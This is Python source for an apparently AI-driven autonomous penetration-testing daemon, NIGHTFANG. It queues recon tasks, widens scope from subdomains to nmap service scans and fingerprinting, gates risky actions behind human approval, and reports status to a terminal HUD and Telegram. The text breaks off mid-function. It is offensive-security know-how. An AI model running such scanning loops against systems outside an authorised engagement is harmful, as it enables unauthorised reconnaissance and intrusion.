#!/usr/bin/env python3
"""
NIGHTFANG Autonomous Hunter Engine Daemon (tools/daemon.py)

Autonomous execution daemon for Hermes that runs continuous penetration testing:
- PriorityDAG Attack Surface Queue (persistent lead tracking)
- Dynamic lead generation (Domain -> Subdomain -> Services -> Parameters -> Variant Hunting)
- Traffic Light Tiered Autonomy (GREEN: auto-run, YELLOW: rate-throttled, RED: non-blocking HITL approval)
- Non-blocking Asynchronous HITL Gate (pauses single action, continues scanning other targets in parallel)
- Self-healing & Reflection (WAF evasion, auto-backoff on 429/503, loop prevention)
"""

import sys
import os
import html
import json
import time
import re
import urllib.parse
import argparse
import heapq
from datetime import datetime, timezone
from enum import Enum
from typing import List, Dict, Any, Optional, Set, Tuple
from dataclasses import dataclass, field, asdict

# Import Execution Policy Gateway & Sandbox
try:
    from tools.gateway import (
        ExecutionPolicyGateway,
        EngagementConfig,
        EngagementState,
        ToolInvocationRequest,
        TargetSpec,
        OpsecSpec,
        NoiseProfile,
        ActionType,
        AutonomyTier,
        DispositionStatus,
        HitlApprovalToken,
        approve_request,
        deny_request,
    )
    from tools.sandbox import SandboxRunner
except ImportError:
    # Handle direct invocation from tools/ directory
    sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
    from gateway import (
        ExecutionPolicyGateway,
        EngagementConfig,
        EngagementState,
        ToolInvocationRequest,
        TargetSpec,
        OpsecSpec,
        NoiseProfile,
        ActionType,
        AutonomyTier,
        DispositionStatus,
        HitlApprovalToken,
        approve_request,
        deny_request,
    )
    from sandbox import SandboxRunner


# ============================================================================
# Priority Queue & Lead Data Model
# ============================================================================

class TaskPriority(int, Enum):
    CRITICAL = 1   # Active exploit verification, verified canary validation
    HIGH = 2       # High-value assets, discovered admin portals, .git leaks
    MEDIUM = 3     # Parameter discovery, directory fuzzing, API schema tests
    LOW = 4        # Broad OSINT, passive subdomain harvest, banner grabs


class TaskStatus(str, Enum):
    PENDING = "PENDING"
    RUNNING = "RUNNING"
    PAUSED_FOR_APPROVAL = "PAUSED_FOR_APPROVAL"
    COMPLETED = "COMPLETED"
    FAILED = "FAILED"
    DENIED = "DENIED"


@dataclass(order=True)
class HunterTask:
    priority_num: int
    task_id: str = field(compare=False)
    target_str: str = field(compare=False)
    capability_id: str = field(compare=False)
    agent_id: str = field(compare=False)
    tool_name: str = field(compare=False)
    command_template: str = field(compare=False)
    noise_profile: NoiseProfile = field(compare=False, default=NoiseProfile.MODERATE)
    action_type: ActionType = field(compare=False, default=ActionType.ACTIVE_PROBE)
    technique: str = field(compare=False, default="Automated Probing")
    finding_id: str = field(compare=False, default="")
    status: TaskStatus = field(compare=False, default=TaskStatus.PENDING)
    created_at: float = field(compare=False, default_factory=time.time)
    retry_count: int = field(compare=False, default=0)
    result_summary: str = field(compare=False, default="")
    evidence_tag: str = field(compare=False, default="")

    @classmethod
    def create(
        cls,
        task_id: str,
        priority: TaskPriority,
        target_str: str,
        capability_id: str,
        agent_id: str,
        tool_name: str,
        command_template: str,
        noise_profile: NoiseProfile = NoiseProfile.MODERATE,
        action_type: ActionType = ActionType.ACTIVE_PROBE,
        technique: str = "Automated Probing",
        finding_id: str = "",
    ) -> "HunterTask":
        return cls(
            priority_num=priority.value,
            task_id=task_id,
            target_str=target_str,
            capability_id=capability_id,
            agent_id=agent_id,
            tool_name=tool_name,
            command_template=command_template,
            noise_profile=noise_profile,
            action_type=action_type,
            technique=technique,
            finding_id=finding_id,
        )


class PriorityDAGQueue:
    """Manages ordered, prioritized leads and subtasks across engagement targets."""

    def __init__(self, storage_path: Optional[str] = None):
        self.storage_path = storage_path
        self._heap: List[HunterTask] = []
        self._task_index: Dict[str, HunterTask] = {}
        self._completed: List[HunterTask] = []
        self._paused_hitl: Dict[str, HunterTask] = {}

    def push(self, task: HunterTask) -> None:
        if task.task_id in self._task_index:
            return  # Prevent duplicate task insertion
        heapq.heappush(self._heap, task)
        self._task_index[task.task_id] = task

    def pop(self) -> Optional[HunterTask]:
        while self._heap:
            task = heapq.heappop(self._heap)
            if task.status == TaskStatus.PENDING:
                return task
        return None

    def pause_for_approval(self, task: HunterTask) -> None:
        task.status = TaskStatus.PAUSED_FOR_APPROVAL
        self._paused_hitl[task.task_id] = task

    def resume_approved(self, task_id: str) -> Optional[HunterTask]:
        task = self._paused_hitl.pop(task_id, None)
        if task:
            task.status = TaskStatus.PENDING
            # Boost priority to CRITICAL upon approval so it runs next
            task.priority_num = TaskPriority.CRITICAL.value
            heapq.heappush(self._heap, task)
            return task
        return None

    def deny_task(self, task_id: str) -> Optional[HunterTask]:
        task = self._paused_hitl.pop(task_id, None)
        if task:
            task.status = TaskStatus.DENIED
            self._completed.append(task)
            return task
        return None

    def mark_completed(self, task: HunterTask, result: str = "", evidence_tag: str = "") -> None:
        task.status = TaskStatus.COMPLETED
        task.result_summary = result
        task.evidence_tag = evidence_tag
        self._completed.append(task)

    def mark_failed(self, task: HunterTask, error: str = "") -> None:
        task.status = TaskStatus.FAILED
        task.result_summary = error
        self._completed.append(task)

    def pending_count(self) -> int:
        return sum(1 for t in self._heap if t.status == TaskStatus.PENDING)

    def paused_count(self) -> int:
        return len(self._paused_hitl)

    def completed_count(self) -> int:
        return len(self._completed)

    def load_state(self) -> None:
        """Load previously saved queue state from storage_path."""
        if not self.storage_path or not os.path.exists(self.storage_path):
            return
        try:
            with open(self.storage_path, "r", encoding="utf-8") as f:
                data = json.load(f)
        except Exception:
            return

        # Reconstruct pending tasks
        for d in data.get("pending", []):
            t = self._dict_to_task(d)
            if t and t.task_id not in self._task_index:
                heapq.heappush(self._heap, t)
                self._task_index[t.task_id] = t

        # Reconstruct paused HITL tasks
        for d in data.get("paused_hitl", []):
            t = self._dict_to_task(d)
            if t:
                t.status = TaskStatus.PAUSED_FOR_APPROVAL
                self._paused_hitl[t.task_id] = t

        # Reconstruct completed tasks
        for d in data.get("completed", []):
            t = self._dict_to_task(d)
            if t:
                self._completed.append(t)

    @staticmethod
    def _dict_to_task(d: Dict[str, Any]) -> Optional[HunterTask]:
        """Reconstruct a HunterTask from its serialized dict form."""
        try:
            # Convert enum strings back to enum values
            noise = d.get("noise_profile")
            if isinstance(noise, str):
                noise = NoiseProfile(noise)
            action = d.get("action_type")
            if isinstance(action, str):
                action = ActionType(action)
            status = d.get("status")
            if isinstance(status, str):
                status = TaskStatus(status)
            return HunterTask(
                priority_num=d.get("priority_num", 3),
                task_id=d.get("task_id", ""),
                target_str=d.get("target_str", ""),
                capability_id=d.get("capability_id", ""),
                agent_id=d.get("agent_id", ""),
                tool_name=d.get("tool_name", ""),
                command_template=d.get("command_template", ""),
                noise_profile=noise if noise is not None else NoiseProfile.MODERATE,
                action_type=action if action is not None else ActionType.ACTIVE_PROBE,
                technique=d.get("technique", ""),
                finding_id=d.get("finding_id", ""),
                status=status if status is not None else TaskStatus.PENDING,
                created_at=d.get("created_at", time.time()),
                retry_count=d.get("retry_count", 0),
                result_summary=d.get("result_summary", ""),
                evidence_tag=d.get("evidence_tag", ""),
            )
        except Exception:
            return None

    def save_state(self) -> None:
        if not self.storage_path:
            return
        os.makedirs(os.path.dirname(os.path.abspath(self.storage_path)), exist_ok=True)
        data = {
            "pending": [asdict(t) for t in self._heap if t.status == TaskStatus.PENDING],
            "paused_hitl": [asdict(t) for t in self._paused_hitl.values()],
            "completed": [asdict(t) for t in self._completed],
            "saved_at": datetime.now(timezone.utc).isoformat(),
        }
        with open(self.storage_path, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2)


# ============================================================================
# Autonomous Hunter Engine Daemon
# ============================================================================

class AutonomousHunterDaemon:
    """Continuous multi-agent autonomous security assessment daemon."""

    def __init__(
        self,
        config: EngagementConfig,
        queue_storage: Optional[str] = None,
        hitl_storage: Optional[str] = None,
        findings_storage: Optional[str] = None,
        sandbox: Optional[SandboxRunner] = None,
    ):
        self.config = config
        self.state = EngagementState(config)
        self.gateway = ExecutionPolicyGateway(self.state, resolve_dns=False)
        self.sandbox = sandbox or SandboxRunner()
        self.queue = PriorityDAGQueue(storage_path=queue_storage)
        self.hitl_storage = hitl_storage
        self.findings_storage = findings_storage
        self.discovered_assets: Set[str] = set()
        self.discovered_findings: List[Dict[str, Any]] = []
        self.is_running = False
        self.step_counter = 0

    def seed_target(self, target: str) -> None:
        """Seed the engine with an initial target boundary."""
        self.discovered_assets.add(target)
        # Step 1: Enqueue passive reconnaissance
        t1 = HunterTask.create(
            task_id=f"task-init-{len(self.queue._task_index) + 1}",
            priority=TaskPriority.HIGH,
            target_str=target,
            capability_id="attack-surface-mapping",
            agent_id="recon",
            tool_name="subdomain_enum.py",
            command_template=f"python skills/recon/scripts/subdomain_enum.py -d {target} --passive",
            noise_profile=NoiseProfile.QUIET,
            action_type=ActionType.PASSIVE_READ,
            technique="Passive DNS & Subdomain Harvesting",
        )
        self.queue.push(t1)

    def execute_next_task(self, dry_run: bool = False) -> Optional[Dict[str, Any]]:
        """Processes the next eligible task from the priority queue.

        Args:
            dry_run: If True, evaluate policy and log decisions without
                     dispatching tool execution.
        """
        task = self.queue.pop()
        if not task:
            return None

        self.step_counter += 1
        ts = TargetSpec(raw_target=task.target_str)
        ts.parse_target()

        req = ToolInvocationRequest(
            request_id=task.task_id,
            engagement_id=self.config.engagement_id,
            agent_id=task.agent_id,
            skill_id=f"skills/{task.agent_id}",
            tool_name=task.tool_name,
            target=ts,
            opsec=OpsecSpec(noise=task.noise_profile),
            command_template=task.command_template,
            action_type=task.action_type,
            technique=task.technique,
            finding_id=task.finding_id,
        )

        # 1. Evaluate Execution Policy Gateway
        disp = self.gateway.evaluate(req)

        # Handle Gateway Results
        if disp.status == DispositionStatus.REJECTED:
            self.queue.mark_failed(task, f"Gateway Rejected: {disp.reason}")
            return {
                "task_id": task.task_id,
                "status": "REJECTED",
                "reason": disp.reason,
            }

        if disp.status == DispositionStatus.HITL_REQUIRED:
            # NON-BLOCKING: Put into paused approvals list and write HITL card
            self.queue.pause_for_approval(task)
            self._record_pending_hitl(disp.hitl_request or {})
            return {
                "task_id": task.task_id,
                "status": "PAUSED_FOR_APPROVAL",
                "hitl_card": disp.hitl_request,
                "note": "Non-blocking: Daemon continues processing other targets.",
            }

        if disp.status == DispositionStatus.QUEUED:
            # Re-enqueue task so it can run once backoff window expires
            self.queue._task_index.pop(task.task_id, None)
            self.queue.push(task)
            return {
                "task_id": task.task_id,
                "status": "QUEUED",
                "reason": disp.reason,
            }

        # 2. Approved or Auto-Passed: Dispatch tool execution
        if dry_run:
            return {
                "task_id": task.task_id,
                "status": "DRY_RUN",
                "command_template": task.command_template,
                "target": task.target_str,
                "note": "Dry-run: no tool execution performed",
            }

        res = self.gateway.execute_and_wrap(req, disp, sandbox_runner=self.sandbox)
        evd_tag = f"[EVD-{res.stdout_sha256[:8]}]" if res.stdout_sha256 else ""

        if res.status != "SUCCESS":
            # Self-Healing & Reflection: Check if failure was caused by rate limit or WAF
            stdout_text = res.raw_stdout or ""
            stderr_text = res.raw_stderr or ""
            combined_text = f"{stdout_text} {stderr_text}"
            if "429" in combined_text or "Too Many Requests" in combined_text:
                self.gateway.state.trigger_rate_backoff(ts.hostname, "HTTP 429 auto-detected")
                task.retry_count += 1
                if task.retry_count <= 2:
                    # Re-enqueue with backoff
                    task.status = TaskStatus.PENDING
                    self.queue._task_index.pop(task.task_id, None)
                    self.queue.push(task)
                    return {
                        "task_id": task.task_id,
                        "status": "RETRY_QUEUED",
                        "retry_count": task.retry_count,
                        "evidence": evd_tag,
                    }
            self.queue.mark_failed(task, res.raw_stderr or "Command failed")
            return {
                "task_id": task.task_id,
                "status": "FAILED",
                "evidence": evd_tag,
            }

        # 3. Successful Execution: Mark complete and dynamically generate new leads!
        self.queue.mark_completed(task, res.raw_stdout[:200], evd_tag)
        self._expand_attack_surface(task, res.raw_stdout)

        return {
            "task_id": task.task_id,
            "status": "COMPLETED",
            "evidence": evd_tag,
            "generated_leads": self.queue.pending_count(),
        }

    def _expand_attack_surface(self, completed_task: HunterTask, stdout: str) -> None:
        """The Big Brain Recursive Lead Generator: Extracts discovered assets and enqueues next-phase tasks."""
        # A. Discovered subdomains / hostnames
        domain_pattern = re.compile(r"\b([a-zA-Z0-9][-a-zA-Z0-9]*\.[a-zA-Z0-9][-a-zA-Z0-9.]+\.[a-zA-Z]{2,})\b")
        found_domains = set(domain_pattern.findall(stdout))

        for dom in found_domains:
            if dom not in self.discovered_assets and self.gateway._is_in_scope(dom):
                self.discovered_assets.add(dom)
                # Enqueue service & port discovery for newly uncovered domain
                next_task = HunterTask.create(
                    task_id=f"lead-scan-{len(self.queue._task_index) + 1}",
                    priority=TaskPriority.HIGH,
                    target_str=dom,
                    capability_id="web-application-security",
                    agent_id="scanner",
                    tool_name="nmap",
                    command_template=f"nmap -sV -T4 --top-ports 20 {dom}",
                    noise_profile=NoiseProfile.MODERATE,
                    action_type=ActionType.ACTIVE_PROBE,
                    technique="Port & Service Fingerprinting",
                )
                self.queue.push(next_task)

        # B. Discovered HTTP URLs or Endpoints -> Enqueue Web / API inspection
        url_pattern = re.compile(r"https?://[^\s\"'>]+")
        found_urls = set(url_pattern.findall(stdout))

        for u in found_urls:
            parsed = urllib.parse.urlparse(u)
            if not parsed.hostname or not self.gateway._is_in_scope(parsed.hostname):
                continue
            if u not in self.discovered_assets:
                self.discovered_assets.add(u)
                # Enqueue parameter fuzzing and tech fingerprinting
                next_task = HunterTask.create(
                    task_id=f"lead-web-{len(self.queue._task_index) + 1}",
                    priority=TaskPriority.MEDIUM,
                    target_str=u,
                    capability_id="web-application-security",
                    agent_id="scanner",
                    tool_name="tech_fingerprint.py",
                    command_template=f"python skills/recon/scripts/tech_fingerprint.py --url {u}",
                    noise_profile=NoiseProfile.MODERATE,
                    action_type=ActionType.ACTIVE_PROBE,
                    technique="Technology Fingerprinting & Recon",
                )
                self.queue.push(next_task)

    def approve_hitl_task(self, request_id: str, operator_id: str = None) -> bool:
        """Approves a paused task, mints an approval token, and resumes it at CRITICAL priority."""
        if operator_id is None:
            operator_id = self.config.authorized_operator
        try:
            token = approve_request(self.state, request_id, operator_id=operator_id)
            resumed = self.queue.resume_approved(request_id)
            if resumed:
                self._update_pending_hitl_storage()
                return True
        except KeyError:
            return False
        return False

    def deny_hitl_task(self, request_id: str) -> bool:
        """Denies a paused task, preventing invasive testing."""
        denied = self.queue.deny_task(request_id)
        if denied:
            deny_request(self.state, request_id)
            self._update_pending_hitl_storage()
            return True
        return False

    def _record_pending_hitl(self, card: Dict[str, Any]) -> None:
        if not self.hitl_storage:
            return
        os.makedirs(os.path.dirname(os.path.abspath(self.hitl_storage)), exist_ok=True)
        cards = []
        if os.path.exists(self.hitl_storage):
            try:
                with open(self.hitl_storage, "r", encoding="utf-8") as f:
                    cards = json.load(f)
            except Exception:
                cards = []
        cards.append(card)
        with open(self.hitl_storage, "w", encoding="utf-8") as f:
            json.dump(cards, f, indent=2)

    def _update_pending_hitl_storage(self) -> None:
        if not self.hitl_storage or not os.path.exists(self.hitl_storage):
            return
        active_ids = set(self.queue._paused_hitl.keys())
        try:
            with open(self.hitl_storage, "r", encoding="utf-8") as f:
                cards = json.load(f)
            cards = [c for c in cards if c.get("request_id") in active_ids]
            with open(self.hitl_storage, "w", encoding="utf-8") as f:
                json.dump(cards, f, indent=2)
        except Exception:
            pass

    def run_continuous(self, max_cycles: int = 100, poll_interval: float = 0.5, dry_run: bool = False) -> None:
        """Runs the autonomous daemon loop continuously.
        
        Args:
            max_cycles: Maximum execution cycles before stopping.
            poll_interval: Seconds to sleep between cycles.
            dry_run: If True, log decisions without executing tool commands.
        """
        mode_str = " [DRY-RUN]" if dry_run else ""
        print(f"[*] Starting NIGHTFANG Autonomous Hunter Daemon [Tier: {self.config.autonomy_tier.value}]{mode_str}")
        self.is_running = True
        cycle = 0

        try:
            while self.is_running and cycle < max_cycles:
                cycle += 1
                if self.queue.pending_count() == 0:
                    if self.queue.paused_count() > 0:
                        print(f"[*] All active tasks processed. Waiting for operator on {self.queue.paused_count()} pending approvals...")
                    else:
                        print("[*] Attack surface queue exhausted. Engagement objectives satisfied.")
                        break
                    time.sleep(poll_interval * 2)
                    continue

                res = self.execute_next_task(dry_run=dry_run)
                if res:
                    st = res["status"]
                    tid = res["task_id"]
                    if st == "COMPLETED":
                        print(f"  [✓] {tid} COMPLETED | Evidence: {res.get('evidence')} | Remaining Leads: {res.get('generated_leads')}")
                    elif st == "PAUSED_FOR_APPROVAL":
                        print(f"  [⚠️] {tid} PAUSED FOR HITL APPROVAL | Non-blocking: daemon continues background hunting")
                    elif st == "FAILED":
                        print(f"  [✗] {tid} FAILED")
                    elif st == "DRY_RUN":
                        print(f"  [🔍] {tid} DRY-RUN (no execution)")
                    elif st in ("QUEUED", "RETRY_QUEUED"):
                        print(f"  [⏳] {tid} {st} (Backoff / Rate Limit)")
                time.sleep(poll_interval)
        except KeyboardInterrupt:
            print("\n[*] Autonomous Hunter Daemon stopped by operator.")
        finally:
            self.queue.save_state()


# ============================================================================
# Self-Test Verification Suite
# ============================================================================

# ============================================================================
# Consolidated Terminal HUD Engine
# ============================================================================

# ANSI escape sequences for formatting
RESET = "\033[0m"
BOLD = "\033[1m"
DIM = "\033[2m"
RED = "\033[31m"
GREEN = "\033[32m"
YELLOW = "\033[33m"
BLUE = "\033[34m"
MAGENTA = "\033[35m"
CYAN = "\033[36m"
WHITE = "\033[37m"
BG_DARK = "\033[40m"


class HunterHUD:
    """Terminal HUD renderer for NIGHTFANG Autonomous Hunter Daemon."""

    def __init__(self, force_ansi: Optional[bool] = None) -> None:
        if force_ansi is not None:
            self.use_ansi = force_ansi
        else:
            self.use_ansi = sys.stdout.isatty() and os.name != "dumb"

    def strip_ansi(self, text: str) -> str:
        """Strip ANSI escape sequences from text for measuring visible length."""
        return re.sub(r"\033\[[0-9;]*[mK]", "", text)

    def colorize(self, text: str, color_code: str) -> str:
        """Wrap text in ANSI color code if ANSI is enabled."""
        if not self.use_ansi:
            return text
        return f"{color_code}{text}{RESET}"

    def get_term_size(self) -> Tuple[int, int]:
        """Get current terminal dimensions (width, height), defaulting to 80x24."""
        try:
            cols, rows = shutil.get_terminal_size(fallback=(80, 24))
            return max(60, cols), max(20, rows)
        except Exception:
            return 80, 24

    def format_box_line(self, content: str, width: int) -> str:
        """Format a single row inside an ASCII/Unicode box with proper padding and boundary alignment."""
        max_content_len = max(0, width - 4)
        visible_len = len(self.strip_ansi(content))
        if visible_len > max_content_len:
            plain = self.strip_ansi(content)
            truncated = plain[: max(0, max_content_len - 3)] + "..."
            return f"│ {truncated} │"
        padding = max(0, max_content_len - visible_len)
        return f"│ {content}{' ' * padding} │"

    def render(
        self,
        engagement_id: str,
        target_scope: List[str],
        autonomy_tier: str,
        status: str,
        queue_counts: Dict[str, int],
        active_tasks: List[Dict[str, str]],
        rate_backoffs: Dict[str, float],
        discovered_assets: List[str],
        pending_hitl: List[Dict[str, str]],
        term_width: Optional[int] = None,
    ) -> str:
        """Render complete HUD frame as a formatted multi-line string."""
        cols, _ = self.get_term_size()
        width = min(term_width or cols, 100)
        inner_width = width - 2

        border_h = "─" * inner_width
        top_border = f"┌{border_h}┐"
        mid_border = f"├{border_h}┤"
        bot_border = f"└{border_h}┘"

        lines: List[str] = [top_border]

        # 1. Header Section
        title = self.colorize("🦇 NIGHTFANG AUTONOMOUS HUNTER HUD", BOLD + CYAN)
        status_color = GREEN if status == "ACTIVE" else (YELLOW if status == "PAUSED" else WHITE)
        status_badge = self.colorize(f"[{status}]", BOLD + status_color)
        lines.append(self.format_box_line(f"{title} {status_badge}", width))

        scope_str = ", ".join(target_scope[:3]) + ("..." if len(target_scope) > 3 else "")
        info_line = (
            f"Engagement: {self.colorize(engagement_id, YELLOW)} │ "
            f"Scope: {self.colorize(scope_str, WHITE)} │ "
            f"Tier: {self.colorize(autonomy_tier, MAGENTA)}"
        )
        lines.append(self.format_box_line(info_line, width))
        lines.append(mid_border)

        # 2. Priority DAG Queue Section
        c_count = queue_counts.get("CRITICAL", 0)
        h_count = queue_counts.get("HIGH", 0)
        m_count = queue_counts.get("MEDIUM", 0)
        l_count = queue_counts.get("LOW", 0)
        total_queued = c_count + h_count + m_count + l_count

        q_header = self.colorize("PRIORITY DAG QUEUE", BOLD)
        q_line = (
            f"{q_header} ({total_queued} tasks): "
            f"{self.colorize(f'CRITICAL: {c_count}', BOLD + RED)} │ "
            f"{self.colorize(f'HIGH: {h_count}', YELLOW)} │ "
            f"{self.colorize(f'MEDIUM: {m_count}', BLUE)} │ "
            f"{self.colorize(f'LOW: {l_count}', DIM)}"
        )
        lines.append(self.format_box_line(q_line, width))

        # 3. Active Host Rate Throttles & Backoffs
        lines.append(mid_border)
        backoff_header = self.colorize("ACTIVE HOST RATE THROTTLES & BACKOFFS", BOLD)
        if rate_backoffs:
            now = time.time()
            backoff_items: List[str] = []
            for host, expire in list(rate_backoffs.items())[:3]:
                remaining = max(0, int(expire - now))
                backoff_items.append(f"{host}: {remaining}s remaining")
            lines.append(self.format_box_line(f"{backoff_header}: {', '.join(backoff_items)}", width))
        else:
            lines.append(self.format_box_line(f"{backoff_header}: None (All target hosts nominal)", width))

        # 4. Active Tasks Execution
        lines.append(mid_border)
        exec_header = self.colorize("ACTIVE CONCURRENCY & EXECUTIONS", BOLD)
        lines.append(self.format_box_line(f"{exec_header} ({len(active_tasks)} active):", width))
        if active_tasks:
            for task in active_tasks[:3]:
                t_str = f"  ▶ [{task.get('tool', 'tool')}] {task.get('target', 'target')} ({task.get('technique', 'scanning')})"
                lines.append(self.format_box_line(self.colorize(t_str, CYAN), width))
        else:
            lines.append(self.format_box_line("  (No tasks currently in flight)", width))

        # 5. Attack Surface Discovered
        lines.append(mid_border)
        assets_header = self.colorize("DISCOVERED ATTACK SURFACE", BOLD)
        assets_preview = ", ".join(discovered_assets[:4]) if discovered_assets else "None"
        if len(discovered_assets) > 4:
            assets_preview += f" (+{len(discovered_assets) - 4} more)"
        lines.append(self.format_box_line(f"{assets_header} ({len(discovered_assets)} assets): {assets_preview}", width))

        # 6. HITL Operator Approval Bar
        lines.append(mid_border)
        hitl_header = self.colorize("OPERATOR HITL APPROVAL GATE", BOLD + (RED if pending_hitl else GREEN))
        if pending_hitl:
            p = pending_hitl[0]
            hitl_msg = f"  ⚠ PENDING APPROVAL: Token [{p.get('token', 'TOKEN')}] for {p.get('technique', 'Exploit')} on {p.get('target', 'target')}"
            lines.append(self.format_box_line(self.colorize(hitl_msg, BOLD + RED), width))
            lines.append(self.format_box_line(f"    Press 'a' to approve, 'd' to deny, 's' to skip", width))
        else:
            lines.append(self.format_box_line(f"{hitl_header}: 0 pending authorizations required", width))

        lines.append(bot_border)
        return "\n".join(lines)


def get_aggregated_state(
    daemon: Optional[Any] = None,
    engagement_id: Optional[str] = None,
    target_scope: Optional[List[str]] = None,
    autonomy_tier: Optional[str] = None,
    status: Optional[str] = None,
    queue_counts: Optional[Dict[str, int]] = None,
    active_tasks: Optional[List[Dict[str, str]]] = None,
    rate_backoffs: Optional[Dict[str, float]] = None,
    discovered_assets: Optional[List[str]] = None,
    pending_hitl: Optional[List[Dict[str, str]]] = None,
    progress: Optional[float] = None,
) -> Dict[str, Any]:
    """Helper to aggregate daemon state into a standardized dictionary for HUD & channel cards."""
    if daemon is not None:
        cfg = getattr(daemon, "config", None)
        return {
            "engagement_id": getattr(cfg, "engagement_id", "ENG-SESSION"),
            "target_scope": list(getattr(cfg, "target_scope", ["localhost"])),
            "autonomy_tier": getattr(cfg, "autonomy_tier", "SEMI_AUTONOMOUS"),
            "status": "ACTIVE" if getattr(daemon, "running", False) else "IDLE",
            "queue_counts": daemon.get_queue_counts() if hasattr(daemon, "get_queue_counts") else {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0},
            "active_tasks": getattr(daemon, "active_tasks", []),
            "rate_backoffs": getattr(daemon, "rate_backoffs", {}),
            "discovered_assets": list(getattr(daemon, "discovered_assets", [])),
            "pending_hitl": getattr(daemon, "pending_hitl", []),
            "progress": getattr(daemon, "progress", 0.0),
        }
    return {
        "engagement_id": engagement_id or "ENG-NIGHTFANG",
        "target_scope": target_scope or ["target.corp"],
        "autonomy_tier": autonomy_tier or "SEMI_AUTONOMOUS",
        "status": status or "IDLE",
        "queue_counts": queue_counts or {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0},
        "active_tasks": active_tasks or [],
        "rate_backoffs": rate_backoffs or {},
        "discovered_assets": discovered_assets or [],
        "pending_hitl": pending_hitl or [],
        "progress": progress if progress is not None else 0.0,
    }



# ============================================================================
# Consolidated Channel Card Formatter
# ============================================================================

TELEGRAM_MAX_LENGTH = 4096


def escape_markdown(text: str) -> str:
    """
    Escape special Markdown characters for safe Telegram transmission.
    Escapes: _ * [ ] ( ) ~ ` > # + - = | { } . ! \\
    """
    if not text:
        return ""
    special_chars = r"_*[]()~`>#+-=|{}.!\\"
    return re.sub(f"([{re.escape(special_chars)}])", r"\\\1", str(text))


def truncate_message(text: str, max_length: int = TELEGRAM_MAX_LENGTH, suffix: str = "\n\n... [truncated for Telegram]") -> str:
    """Ensure message does not exceed Telegram's character limit."""
    if len(text) <= max_length:
        return text
    cutoff = max_length - len(suffix)
    return text[:cutoff] + suffix


def normalize_target_host(target: str) -> str:
    """Extract host/domain/IP part from target string (e.g. https://api.corp.com:443/v1 -> api.corp.com)."""
    t = str(target).strip()
    if not t:
        return "general"
    if "://" in t:
        t = t.split("://", 1)[1]
    if "/" in t:
        t = t.split("/", 1)[0]
    if "@" in t:
        t = t.split("@", 1)[1]
    if ":" in t:
        if t.startswith("[") and "]" in t:
            t = t.split("]")[0] + "]"
        else:
            t = t.split(":", 1)[0]
    return t.strip().lower()


def is_ip_address(host: str) -> bool:
    """Check if host is an IPv4 or IPv6 address."""
    clean = host.strip("[]").strip()
    parts = clean.split(".")
    if len(parts) == 4 and all(p.isdigit() and 0 <= int(p) <= 255 for p in parts):
        return True
    if ":" in clean:
        return True
    return False


def extract_root_domain(host: str) -> str:
    """
    Extract root/apex domain from host or target URL.
    Examples:
      - 'api.corp.test' -> 'corp.test'
      - 'admin.dev.target.corp' -> 'target.corp'
      - 'target.corp' -> 'target.corp'
      - 'sub.example.co.uk' -> 'example.co.uk'
      - '192.168.1.1' -> '192.168.1.1'
      - 'localhost' -> 'localhost'
    """
    clean_host = normalize_target_host(host)
    if not clean_host or clean_host == "localhost" or is_ip_address(clean_host):
        return clean_host or "general"

    labels = clean_host.split(".")
    if len(labels) <= 2:
        return clean_host

    cc_second_levels = {"co", "com", "net", "org", "gov", "edu", "ac"}
    if len(labels) >= 3 and labels[-2] in cc_second_levels and len(labels[-1]) == 2:
        return ".".join(labels[-3:])

    return ".".join(labels[-2:])


class ChannelCardFormatter:
    """Mobile and remote channel card formatter for Hermes/Telegram."""

    def __init__(self, use_markdown: bool = True) -> None:
        self.use_markdown = use_markdown

    @staticmethod
    def render_progress_bar(percentage: float, width: int = 10) -> str:
        """Render ASCII/block progress bar: [████████░░] 80%"""
        clamped = max(0.0, min(100.0, percentage))
        filled = int(round((clamped / 100.0) * width))
        empty = max(0, width - filled)
        bar = "█" * filled + "░" * empty
        return f"[{bar}] {int(round(clamped))}%"

    def format_status_card(self, state: Dict[str, Any]) -> str:
        """
        Format /status card for Telegram:
        - ASCII visual progress bar
        - Queue counters (CRITICAL, HIGH, MEDIUM, LOW)
        - Active rate limiter state / backoffs
        - Target scope & status
        - Pending HITL authorization count
        """
        engagement_id = state.get("engagement_id", "ENG-SESSION")
        scope = state.get("target_scope", ["target.corp"])
        status = state.get("status", "IDLE")
        tier = state.get("autonomy_tier", "SEMI_AUTONOMOUS")
        progress = float(state.get("progress", 0.0))
        queue_counts = state.get("queue_counts", {})
        c_count = queue_counts.get("CRITICAL", 0)
        h_count = queue_counts.get("HIGH", 0)
        m_count = queue_counts.get("MEDIUM", 0)
        l_count = queue_counts.get("LOW", 0)
        total_tasks = c_count + h_count + m_count + l_count

        active_tasks = state.get("active_tasks", [])
        rate_backoffs = state.get("rate_backoffs", {})
        pending_hitl = state.get("pending_hitl", [])

        bar = self.render_progress_bar(progress)

        scope_str = ", ".join(scope[:3])
        if len(scope) > 3:
            scope_str += f" (+{len(scope) - 3} more)"

        lines = [
            "🦇 *NIGHTFANG HUNT STATUS*",
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━",
            f"🎯 *Scope:* `{scope_str}`",
            f"⚡ *Autonomy:* `{tier}` | *State:* `{status}`",
            f"📊 *Progress:* `{bar}`",
            "",
            "📋 *Task Queue DAG:*",
            f"  🔴 Critical: `{c_count}` | 🟠 High: `{h_count}`",
            f"  🟡 Medium: `{m_count}` | ⚪ Low: `{l_count}`",
            f"  📦 Total In Queue: `{total_tasks}`",
            "",
            f"🚀 *Active Concurrency:* `{len(active_tasks)}` running",
        ]

        if active_tasks:
            for t in active_tasks[:3]:
                lines.append(f"  ▶ `[{t.get('tool', 'tool')}]` {t.get('target', 'target')} \\({t.get('technique', 'probing')}\\)")

        if rate_backoffs:
            now = time.time()
            backoff_strs = []
            for h, expire in list(rate_backoffs.items())[:3]:
                rem = max(0, int(expire - now))
                backoff_strs.append(f"`{h}`: {rem}s")
            lines.append(f"⏳ *Host Throttles:* {', '.join(backoff_strs)}")
        else:
            lines.append("⏳ *Host Throttles:* Nominal (no backoffs)")

        lines.append("")
        if pending_hitl:
            p = pending_hitl[0]
            token = p.get("token") or p.get("request_id") or "UNKNOWN"
            target = p.get("target", "target")
            lines.append(f"⚠️ *HITL Approvals Required:* `{len(pending_hitl)}` pending")
            lines.append(f"👉 Action required: `/go {token}` or `/hold {token}` for `{target}`")
        else:
